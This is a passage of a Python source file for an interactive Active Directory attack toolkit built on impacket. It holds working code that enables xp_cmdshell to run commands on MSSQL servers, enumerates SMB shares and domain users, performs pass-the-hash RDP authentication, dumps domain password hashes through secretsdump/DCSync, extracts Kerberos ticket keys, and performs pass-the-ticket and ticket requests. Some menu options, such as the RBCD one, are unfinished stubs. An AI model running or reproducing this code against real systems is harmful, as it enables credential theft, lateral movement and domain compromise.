            print(f"  {C}Manual PowerShell command:{RS}")
            prog_id = "MMC20.Application"
            print(f"  {W}  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(chr(39)+{prog_id}+chr(39), chr(39)+{target}+chr(39))){RS}")
            print(f"  {W}  $dcom.Document.ActiveView.ExecuteShellCommand(chr(39)+{command}+chr(39), $null, $null, chr(39)+7+chr(39)){RS}")

    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "access denied" in error_msg:
            print(f"  {R}[!] Access denied — no ExecuteDCOM edge or not admin{RS}")
        elif "rpc_s_server_unavailable" in error_msg:
            print(f"  {R}[!] DCOM/RPC unavailable — firewall or wrong target{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP or target down{RS}")
        else:
            print(f"  {R}[!] DCOM error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 5 — SQLAdmin (MSSQL xp_cmdshell via pymssql/pytds)
# ════════════════════════════════════════════════════════════════════════════
def technique_sqladmin(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 5: SQLAdmin — MSSQL xp_cmdshell ]{RS}")
    print(f"  {Y}Requires: SQLAdmin edge (sysadmin on MSSQL instance){RS}")
    print(f"  {Y}Port: 1433 (MSSQL){RS}")

    if not check_host_reachable(target, 1433, timeout=3):
        print(f"  {Y}[!] Port 1433 (MSSQL) not reachable on {target}{RS}")
        print(f"  {Y}    Wrong IP, custom port, or MSSQL not running.{RS}")
        cont = safe_input(
            C + "[?] Continue anyway? (y/N): " + RS,
            allow_empty=True
        )
        if cont.lower() not in ('y', 'yes'):
            return

    instance = safe_input(
        C + "[?] Instance name        : " + RS,
        allow_empty=True
    ) or "MSSQLSERVER"

    command = safe_input(
        C + "[?] Command to execute   : " + RS,
        allow_empty=True
    ) or "whoami"

    print(f"\n  {B}[*] Connecting to MSSQL on {target}...{RS}")

    # Try pymssql first, then pytds, then impacket tds
    connection_success = False

    # Option 1: pymssql
    try:
        import pymssql
        print(f"  {G}[+] Using pymssql{RS}")

        conn = pymssql.connect(
            server=target,
            user=f"{domain}\\{username}" if domain else username,
            password=password if password else "",
            database="master",
            login_timeout=10,
            timeout=30
        )

        cursor = conn.cursor()
        connection_success = True

        print(f"  {G}[+] MSSQL authenticated as {username}{RS}")

        print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
        cursor.execute("EXEC sp_configure 'show advanced options', 1")
        cursor.execute("RECONFIGURE")
        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1")
        cursor.execute("RECONFIGURE")

        print(f"  {B}[*] Executing: {command}{RS}")
        cursor.execute(f"EXEC xp_cmdshell '{command}'")

        rows = cursor.fetchall()
        if rows:
            print(f"\n{G}{BO}[ OUTPUT ]{RS}")
            for row in rows:
                if row[0]:
                    print(f"  {W}{row[0]}{RS}")

        conn.close()
        print(f"\n  {G}[+] Execution completed{RS}")
        return

    except ImportError:
        print(f"  {Y}[~] pymssql not available, trying pytds...{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "login failed" in error_msg:
            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
            return
        print(f"  {Y}[~] pymssql failed: {e}, trying pytds...{RS}")

    # Option 2: pytds
    try:
        import pytds
        print(f"  {G}[+] Using pytds{RS}")

        with pytds.connect(
            dsn=target,
            database="master",
            user=f"{domain}\\{username}" if domain else username,
            password=password if password else "",
            login_timeout=10,
            timeout=30
        ) as conn:
            with conn.cursor() as cursor:
                connection_success = True
                print(f"  {G}[+] MSSQL authenticated as {username}{RS}")

                print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
                cursor.execute("EXEC sp_configure 'show advanced options', 1")
                cursor.execute("RECONFIGURE")
                cursor.execute("EXEC sp_configure 'xp_cmdshell', 1")
                cursor.execute("RECONFIGURE")

                print(f"  {B}[*] Executing: {command}{RS}")
                cursor.execute(f"EXEC xp_cmdshell '{command}'")

                rows = cursor.fetchall()
                if rows:
                    print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                    for row in rows:
                        if row[0]:
                            print(f"  {W}{row[0]}{RS}")

        print(f"\n  {G}[+] Execution completed{RS}")
        return

    except ImportError:
        print(f"  {Y}[~] pytds not available, trying impacket TDS...{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "login failed" in error_msg:
            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
            return
        print(f"  {Y}[~] pytds failed: {e}, trying impacket TDS...{RS}")

    # Option 3: impacket TDS
    try:
        from impacket.tds import MSSQL
        print(f"  {G}[+] Using impacket TDS{RS}")

        mssql = MSSQL(target, port=1433)
        mssql.connect()

        if password:
            mssql.login(None, username, password, domain, None, None)
        elif nt_hash:
            mssql.login(None, username, "", domain, None, None, 
                       hashes=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}")

        print(f"  {G}[+] MSSQL authenticated as {username}{RS}")

        print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
        mssql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
        mssql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")

        print(f"  {B}[*] Executing: {command}{RS}")
        mssql.sql_query(f"EXEC xp_cmdshell '{command}';")

        results = mssql.rows
        if results:
            print(f"\n{G}{BO}[ OUTPUT ]{RS}")
            for row in results:
                if row[0]:
                    print(f"  {W}{row[0]}{RS}")

        mssql.disconnect()
        print(f"\n  {G}[+] Execution completed{RS}")

    except ImportError as ie:
        print(f"  {R}[!] Missing MSSQL library: {ie}{RS}")
        print(f"  {Y}    Install one of: pip install pymssql pytds impacket{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "login failed" in error_msg:
            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP or MSSQL not running{RS}")
        else:
            print(f"  {R}[!] MSSQL error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 6 — HasSession (Session enumeration via impacket SMB)
# ════════════════════════════════════════════════════════════════════════════
def technique_hassession(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 6: HasSession — Session Enumeration ]{RS}")
    print(f"  {Y}Requires: Any authenticated access to target{RS}")
    print(f"  {Y}Goal: Find logged-in users for token theft / session hijack{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    print(f"  {B}[*] Enumerating sessions on {target}...{RS}")

    try:
        from impacket.smbconnection import SMBConnection
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)

        if nt_hash:
            smb_conn.login(username, "", domain, lm_hash, nt_hash)
        else:
            smb_conn.login(username, password, domain)

        print(f"  {G}[+] SMB authenticated as {username}@{domain}{RS}")

        # Try NetSessEnum
        try:
            from impacket.dcerpc.v5.srvs import NetrSessionEnum
            from impacket.dcerpc.v5.transport import SMBTransport

            rpctransport = SMBTransport(target, 445, r'\\srvsvc', smb_conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(NetrSessionEnum.get_uuid())

            print(f"  {Y}[~] NetSessEnum requires admin privileges{RS}")

        except ImportError as ie:
            print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        except Exception as e:
            print(f"  {Y}[~] Session enumeration via RPC failed: {e}{RS}")

        # List shares
        print(f"\n  {B}[*] Listing accessible shares...{RS}")
        shares = smb_conn.listShares()
        print(f"  {'-'*50}")
        for s in shares:
            share_name = s['shi1_netname'][:-1]
            print(f"  {W}  \\{target}\\{share_name}{RS}")
        print(f"  {'-'*50}")

        # Try to enumerate sessions via SAMR
        try:
            from impacket.dcerpc.v5 import transport, samr
            from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

            string_binding = f'ncacn_np:{target}[\\pipe\\samr]'
            tr = transport.DCERPCTransportFactory(string_binding)
            if nt_hash:
                tr.set_credentials(username, "", domain, lm_hash, nt_hash)
            else:
                tr.set_credentials(username, password, domain, "", "")

            dce = tr.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            server_hd = resp['ServerHandle']

            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
            domain_sid = resp['DomainId']

            resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
            domain_hd = resp['DomainHandle']

            # Enumerate users in domain
            enumeration_context = 0
            print(f"\n  {B}[*] Enumerating domain users via SAMR...{RS}")
            print(f"  {'-'*50}")
            print(f"  {'RID':<10} {'USERNAME':<30}")
            print(f"  {'-'*50}")

            while True:
                resp = samr.hSamrEnumerateUsersInDomain(dce, domain_hd, enumerationContext=enumeration_context)
                if resp['Buffer']['Buffer']:
                    for user in resp['Buffer']['Buffer']:
                        rid = user['RelativeId']['Data']
                        name = user['Name']['Data']
                        print(f"  {rid:<10} {W}{name}{RS}")
                enumeration_context = resp['EnumerationContext']
                if resp['Status'] != 0x00000105:
                    break

            print(f"  {'-'*50}")

            samr.hSamrCloseHandle(dce, domain_hd)
            samr.hSamrCloseHandle(dce, server_hd)
            dce.disconnect()

        except ImportError as ie:
            print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        except Exception as e:
            print(f"  {Y}[~] SAMR enumeration failed: {e}{RS}")

        smb_conn.close()

        print(f"\n  {C}For session hijacking, use:{RS}")

    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg:
            print(f"  {R}[!] Authentication failed{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP{RS}")
        else:
            print(f"  {R}[!] Error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 7 — RemoteInteractiveLogonRight (RestrictedAdmin RDP)
# ════════════════════════════════════════════════════════════════════════════
def technique_remoteinteractive(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 7: RemoteInteractiveLogonRight — RestrictedAdmin RDP ]{RS}")
    print(f"  {Y}Requires: RemoteInteractiveLogonRight + NTLM hash (Pass-the-Hash){RS}")
    print(f"  {Y}Note: RestrictedAdmin mode allows PTH over RDP{RS}")

    if not nt_hash and not password:
        print(f"  {Y}[!] RestrictedAdmin requires credentials{RS}")
        return

    if not check_host_reachable(target, 3389, timeout=3):
        print(f"  {Y}[!] Port 3389 (RDP) not reachable on {target}{RS}")
        cont = safe_input(
            C + "[?] Continue anyway? (y/N): " + RS,
            allow_empty=True
        )
        if cont.lower() not in ('y', 'yes'):
            return

    print(f"  {W}Select mode:{RS}")
    print(f"    {C}[1]{W} Authenticate only (verify RestrictedAdmin + PTH){RS}")
    print(f"    {C}[2]{W} Full session (basic terminal — experimental){RS}")
    print(f"    {C}[3]{W} Print connection details{RS}")

    mode = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1-3"
    )

    if mode == "3":
        print(f"\n  {C}RestrictedAdmin RDP Details:{RS}")
        print(f"  {W}  Target:   {target}:3389{RS}")
        print(f"  {W}  Domain:   {domain}{RS}")
        print(f"  {W}  Username: {username}{RS}")
        if nt_hash:
            print(f"  {W}  Auth:     Pass-the-Hash (NTLM){RS}")
            print(f"  {W}  NT Hash:  {nt_hash}{RS}")
        print(f"\n  {Y}[!] Target must have 'DisableRestrictedAdmin' registry set to 0{RS}")
        print(f"  {Y}    Check: reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin{RS}")
        return

    client = PureRDPClient(target, domain, username, password, nt_hash)

    if not client.connect():
        return

    if mode == "1":
        print(f"\n  {B}[*] Attempting RestrictedAdmin authentication...{RS}")
        if client.send_x224_connect_request():
            if client.ntlm_authenticate():
                print(f"\n  {G}{BO}[+] RestrictedAdmin RDP successful!{RS}")
                print(f"  {G}[+] Pass-the-Hash worked on {target}{RS}")
                print(f"\n  {C}You can now establish full RDP session:{RS}")
                print(f"  {W}  This toolkit provides auth verification only.{RS}")
                print(f"  {W}  For GUI session, use an RDP client with the same creds.{RS}")
            else:
                print(f"\n  {R}[!] Authentication failed{RS}")
        client.close()
    elif mode == "2":
        print(f"\n  {Y}[!] Full RDP session requires GUI libraries{RS}")
        print(f"  {Y}    This toolkit focuses on authentication & lateral movement.{RS}")
        print(f"  {C}For full session, build RDP client with:{RS}")
        print(f"  {W}  pip install pyqt5 pyfreerdp{RS}")
        client.close()


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 8 — ClaimSpecialIdentity (RBCD / S4U2Self)
# ════════════════════════════════════════════════════════════════════════════
def technique_claimspecial(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 8: ClaimSpecialIdentity — RBCD / S4U2Self ]{RS}")
    print(f"  {Y}Requires: GenericWrite/GenericAll on computer account (RBCD){RS}")
    print(f"  {Y}          OR TrustedToAuthForDelegation (S4U2Self){RS}\n")

    print(f"  {W}Select RBCD abuse method:{RS}")
    print(f"    {C}[1]{W} Set RBCD on target (requires LDAP + computer account control){RS}")
    print(f"    {C}[2]{W} S4U2Self (requires TrustedToAuthForDelegation){RS}")

    method = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1-3"
    )

    attacker_spn = safe_input(
        C + "[?] Attacker SPN/computer: " + RS,
        allow_empty=True
    ) or "ATTACKER$"

    if method == "3":
        print(f"\n  {C}Step 1: Set RBCD on target (as domain admin or with GenericWrite){RS}")
        print(f"\n  {C}Step 2: Request service ticket with S4U2Self{RS}")
        print(f"\n  {C}Step 3: Use the ticket{RS}")
        print(f"  {W}  export KRB5CCNAME=Administrator.ccache{RS}")
        return

    if method == "1":
        print(f"\n  {Y}[!] Automated RBCD requires ldap3. Showing commands...{RS}")
    elif method == "2":
        print(f"\n  {Y}[!] Automated S4U2Self requires impacket getST. Showing commands...{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 9 — Kerberos (Ticket Operations)
# ════════════════════════════════════════════════════════════════════════════
def technique_kerberos_menu(dc_ip, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 9: Kerberos Ticket Operations ]{RS}")
    print(f"  {W}Select operation:{RS}")
    print(f"    {C}[1]{W} dump     — Remote hash dump via DCE/RPC{RS}")
    print(f"    {C}[2]{W} ccache   — Parse .ccache files on disk{RS}")
    print(f"    {C}[3]{W} convert  — Convert .kirbi ↔ .ccache{RS}")
    print(f"    {C}[4]{W} ptt      — Pass-the-Ticket{RS}")
    print(f"    {C}[5]{W} request  — Request fresh TGT/TGS{RS}")

    choice = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3', '4', '5'],
        "Invalid choice! Enter 1-5"
    )

    if choice == "1":
        creds = get_creds()
        if creds[0] is None:
            return
        username, password, nt_hash, ccache = creds
        technique_remote_dump(dc_ip, domain, username, password, nt_hash)
    elif choice == "2":
        technique_parse_ccache(domain)
    elif choice == "3":
        technique_convert()
    elif choice == "4":
        technique_ptt(dc_ip, domain)
    elif choice == "5":
        technique_request(dc_ip, domain)


def technique_remote_dump(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 9a: Remote secretsdump ]{RS}")
    print(f"  {Y}Flow: SMB auth → DRSUAPI/SAMR/WINREG → hash extraction{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    print(f"  {B}[*] Connecting to {target} via SMB...{RS}")
    try:
        from impacket.smbconnection import SMBConnection
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.login(username, password, domain, lm_hash, nt_hash)
        print(f"  {G}  [+] SMB authenticated as {username}@{domain}{RS}")
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        return
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Wrong credentials{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Connection timeout (wrong IP?){RS}")
        elif "name or service not known" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Cannot resolve target (wrong domain?){RS}")
        else:
            print(f"  {R}  [!] SMB auth failed: {e}{RS}")
        return

    print(f"\n  {B}[*] Setting up remote operations...{RS}")
    try:
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        remote_ops = RemoteOperations(smb_conn, False)
        remote_ops.enableRegistry()
        print(f"  {G}  [+] Remote registry enabled{RS}")
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        smb_conn.close()
        return
    except Exception as e:
        print(f"  {R}  [!] RemoteOperations failed: {e}{RS}")
        smb_conn.close()
        return

    try:
        boot_key = remote_ops.getBootKey()
        print(f"  {G}  [+] Boot key: {hexlify(boot_key).decode()}{RS}")
    except Exception as e:
        print(f"  {Y}  [~] SAM: {e}{RS}")
        boot_key = None

    print(f"\n  {B}[*] Attempting DCSync (DRSUAPI)...{RS}")
    try:
        ntds = NTDSHashes(
            None, boot_key,
            isRemote=True, history=False, noLMHash=True,
            remoteOps=remote_ops, useVSSMethod=False,
            justNTLM=False, pwdLastSet=False,
            resumeSession=None, outputFileName=None,
            justUser=None, printUserStatus=False
        )

        print(f"\n  {G}{BO}[ DOMAIN HASHES ]{RS}")
        print(f"  {'-'*60}")

        ntds.dump()
        ntds.finish()
        print(f"  {'-'*60}")

    except Exception as e:
        print(f"  {Y}  [~] DCSync not available: {e}{RS}")

    try:
        remote_ops.finish()
    except:
        pass
    smb_conn.close()


def technique_parse_ccache(domain):
    print(f"\n{C}{BO}[ TECHNIQUE 9b: Parse .ccache Files ]{RS}")

    print(f"\n  {W}Scan dir or single file? {C}[1=dir / 2=file]{W}: {RS}", end="")
    ch = safe_input(
        "",
        lambda x: x in ['1', '2'],
        "Invalid choice! Enter 1 or 2"
    )

    if ch == "2":
        ccache_file = safe_input(C + "[?] File path            : " + RS)
        if not os.path.exists(ccache_file):
            print(f"  {R}[!] File not found: {ccache_file}{RS}")
            return
        files = [ccache_file]
    else:
        ccache_dir = safe_input(
            C + "[?] Directory to scan    : " + RS,
            allow_empty=True
        ) or "/tmp"
        patterns = [
            os.path.join(ccache_dir, "krb5cc_*"),
            os.path.join(ccache_dir, "*.ccache"),
        ]
        files = []
        for pat in patterns:
            files.extend(glob.glob(pat))
        env_cache = os.environ.get('KRB5CCNAME', '')
        if env_cache and env_cache not in files and os.path.exists(env_cache):
            files.append(env_cache)

    if not files:
        print(f"  {Y}[~] No .ccache files found{RS}")
        print(f"  {Y}    Generate one first with option [5] Request TGT{RS}")
        return

    print(f"\n  {G}[+] Found {len(files)} ccache file(s){RS}\n")
    all_tickets = []

    try:
        from impacket.krb5.ccache import CCache
        from impacket.krb5.types import KerberosTime
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        return

    for filepath in files:
        print(f"  {W}{BO}[ {filepath} ]{RS}")
        try:
            cc = CCache.loadFile(filepath)
        except Exception as e:
            print(f"  {R}  [!] Could not parse: {e}{RS}\n")
            continue

        try:
            print(f"  {C}  Owner: {cc.principal.prettyPrint()}{RS}")
        except:
            print(f"  {C}  Owner: (unknown){RS}")

        print(f"  {'-'*55}")
        print(f"  {'SERVICE':<40} {'EXPIRES':<20} TYPE")
        print(f"  {'-'*55}")

        for cred in cc.credentials:
            try:
                server = cred['server'].prettyPrint()
                try:
                    endtime = KerberosTime.fromASN1(cred['time']['endtime'])
                    now     = datetime.now(timezone.utc)
                    expired = endtime < now
                    exp_str = endtime.strftime("%Y-%m-%d %H:%M")
                    exp_col = R if expired else G
                    exp_tag = " [EXPIRED]" if expired else ""
                except:
                    exp_str, exp_col, exp_tag = "unknown", Y, ""

                is_tgt = 'krbtgt' in server.lower()
                ttype  = f"{Y}TGT{RS}" if is_tgt else f"{B}TGS{RS}"

                print(f"  {W}{server:<40}{RS} {exp_col}{exp_str}{exp_tag}{RS:<10} {ttype}")

                try:
                    keytype    = int(cred['key']['keytype'])
                    keydata    = bytes(cred['key']['keyvalue'])
                    etype_name = {17:"AES128",18:"AES256",23:"RC4-HMAC"}.get(keytype, f"etype-{keytype}")
                    print(f"    {C}Key: {etype_name} | {hexlify(keydata).decode()[:32]}...{RS}")
                except:
                    pass

                all_tickets.append({'file': filepath, 'server': server, 'is_tgt': is_tgt})
            except Exception as e:
                print(f"  {R}  Error: {e}{RS}")
        print()

    tgts = [t for t in all_tickets if t['is_tgt']]
    print(f"  {G}{BO}Summary: {len(tgts)} TGT(s) | {len(all_tickets)-len(tgts)} TGS(s){RS}")

    if tgts:
        dc_fqdn = f"DC01.{domain}"
        print(f"\n  {C}Use a TGT:{RS}")
        for t in tgts[:2]:
            print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")


def technique_convert():
    print(f"\n{C}{BO}[ TECHNIQUE 9c: Ticket Format Conversion ]{RS}")
    print(f"  {Y}  .ccache = Linux (impacket){RS}\n")

    input_file  = safe_input(C + "[?] Input file (.kirbi/.ccache): " + RS)
    output_file = safe_input(C + "[?] Output file (.ccache/.kirbi): " + RS)

    if not os.path.exists(input_file):
        print(f"  {R}[!] File not found: {input_file}{RS}")
        return

    ext_in  = input_file.lower().split('.')[-1]
    ext_out = output_file.lower().split('.')[-1]

    try:
        from impacket.krb5.ccache import CCache
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        return

    if ext_in in ('kirbi', 'bin') and ext_out == 'ccache':
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            try:
                data = base64.b64decode(data)
                print(f"  {Y}  (base64 decoded){RS}")
            except:
                pass
            cc = CCache()
            cc.fromKirbi(data)
            cc.saveFile(output_file)
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {W}  export KRB5CCNAME={output_file}{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")

    elif ext_in == 'ccache' and ext_out in ('kirbi', 'bin'):
        try:
            cc    = CCache.loadFile(input_file)
            kirbi = cc.toKirbi()
            with open(output_file, 'wb') as f:
                f.write(kirbi)
            b64 = base64.b64encode(kirbi).decode()
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {Y}  {b64[:80]}...{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")
    else:
        print(f"  {R}[!] Unsupported: {ext_in} → {ext_out}{RS}")
        print(f"      Use: .kirbi → .ccache  or  .ccache → .kirbi")


def technique_ptt(target, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 9d: Pass-the-Ticket ]{RS}")

    ccache_file = safe_input(C + "[?] .ccache file path    : " + RS)
    username    = safe_input(
        C + "[?] Username             : " + RS,
        allow_empty=True
    ) or "Administrator"

    if not os.path.exists(ccache_file):
        print(f"  {R}[!] File not found: {ccache_file}{RS}")
        return

    print(f"\n  {B}[*] Inspecting ticket...{RS}")
    try:
        from impacket.krb5.ccache import CCache
        cc = CCache.loadFile(ccache_file)
        for cred in cc.credentials:
            try:
                print(f"  {G}  ✓ {cred['server'].prettyPrint()}{RS}")
            except:
                pass
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        return
    except Exception as e:
        print(f"  {R}[!] Failed to read: {e}{RS}")
        return

    os.environ['KRB5CCNAME'] = ccache_file
    print(f"\n  {G}[+] KRB5CCNAME set → {ccache_file}{RS}")

    print(f"\n  {B}[*] Testing SMB with ticket...{RS}")
    try:
        from impacket.smbconnection import SMBConnection
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.kerberosLogin(username, "", domain, "", "", "", kdcHost=target)
        print(f"  {G}[+] SMB authenticated via Kerberos!{RS}")
        shares = smb_conn.listShares()
        for s in shares:
            print(f"    {W}  {s['shi1_netname'][:-1]}{RS}")
        smb_conn.close()
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
    except Exception as e:
        print(f"  {R}[!] SMB failed: {e}{RS}")
        print(f"  {Y}    Use FQDN not IP for Kerberos auth{RS}")

    dc_fqdn = f"DC01.{domain}"
    print(f"\n  {C}Commands to use this ticket:{RS}")
    print(f"  {W}  export KRB5CCNAME={ccache_file}{RS}")


def technique_request(target, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 9e: Request Fresh Ticket ]{RS}")

    creds = get_creds()
    if creds[0] is None:
        return
    username, password, nt_hash, ccache = creds

    spn = safe_input(
        C + "[?] Target SPN (optional): " + RS,
        allow_empty=True
    )

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants
        from impacket.krb5.ccache import CCache
    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
        return

    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    print(f"\n  {B}[*] Requesting TGT for {username}@{domain.upper()}...{RS}")
    try:
        if nt_hash:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password="", domain=domain,
                lmhash=bytes.fromhex(lm_hash), nthash=bytes.fromhex(nt_hash),
                aesKey="", kdcHost=target
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password=password, domain=domain,
                lmhash=b"", nthash=b"", aesKey="", kdcHost=target
            )
        print(f"  {G}  [+] TGT obtained!{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "preauthentication" in error_msg or "preauth" in error_msg:
            print(f"  {R}  [!] TGT failed: Pre-authentication failed (wrong password/hash){RS}")
        elif "client not found" in error_msg:
            print(f"  {R}  [!] TGT failed: User '{username}' not found in domain '{domain}'{RS}")
        elif "cannot contact" in error_msg or "kdc" in error_msg:
            print(f"  {R}  [!] TGT failed: Cannot contact KDC at {target} (wrong IP?){RS}")
        elif "timeout" in error_msg:
            print(f"  {R}  [!] TGT failed: Connection timeout (wrong IP?){RS}")
        else:
            print(f"  {R}  [!] TGT failed: {e}{RS}")
        return

    outfile = f"{username}_tgt.ccache"
    cc = CCache()
    cc.fromTGT(tgt, old_sk, sk)
    cc.saveFile(outfile)
    print(f"  {G}  [+] Saved: {outfile}{RS}")

    if spn:
        print(f"\n  {B}[*] Requesting TGS for {spn}...{RS}")
        try:
            server     = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, c2, o2, s2 = getKerberosTGS(
                serverName=server, domain=domain, kdcHost=target,
                tgt=tgt, cipher=cipher, sessionKey=sk
            )
            tgs_file = f"{username}_{spn.replace('/','_')}.ccache"
            cc2 = CCache()
            cc2.fromTGS(tgs, o2, s2)
            cc2.saveFile(tgs_file)
            print(f"  {G}  [+] TGS saved: {tgs_file}{RS}")
        except Exception as e:
            print(f"  {R}  [!] TGS failed: {e}{RS}")

    print(f"\n  {C}Use it:{RS}")
    print(f"  {W}  export KRB5CCNAME={outfile}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    banner()

    try:
        dc_ip, domain = get_config()
        if dc_ip is None or domain is None:
            print(f"\n{Y}[!] Configuration cancelled.{RS}")
            sys.exit(0)

        while True:
            if INTERRUPTED:
                break

            choice = show_menu()

            if choice == "0":
                print(f"\n  {Y}Bye!{RS}\n")
                break

            if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
                creds = get_creds()
                if creds[0] is None:
                    continue
                username, password, nt_hash, ccache = creds

            if choice == "1":
                technique_adminto(dc_ip, domain, username, password, nt_hash, ccache)
            elif choice == "2":
                technique_canrdp(dc_ip, domain, username, password, nt_hash)
            elif choice == "3":
                technique_canpsremote(dc_ip, domain, username, password, nt_hash)
            elif choice == "4":
                technique_executedcom(dc_ip, domain, username, password, nt_hash)
            elif choice == "5":
                technique_sqladmin(dc_ip, domain, username, password, nt_hash)
            elif choice == "6":
                technique_hassession(dc_ip, domain, username, password, nt_hash)
            elif choice == "7":
                technique_remoteinteractive(dc_ip, domain, username, password, nt_hash)
            elif choice == "8":
                technique_claimspecial(dc_ip, domain, username, password, nt_hash)
            elif choice == "9":
                technique_kerberos_menu(dc_ip, domain)

            try:
                input(f"\n  {Y}Press Enter to return to menu...{RS}")
            except:
                pass

    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Interrupted by user. Exiting...{RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{RS}")
        sys.exit(1)


if __name__ == "__main__":
    main()
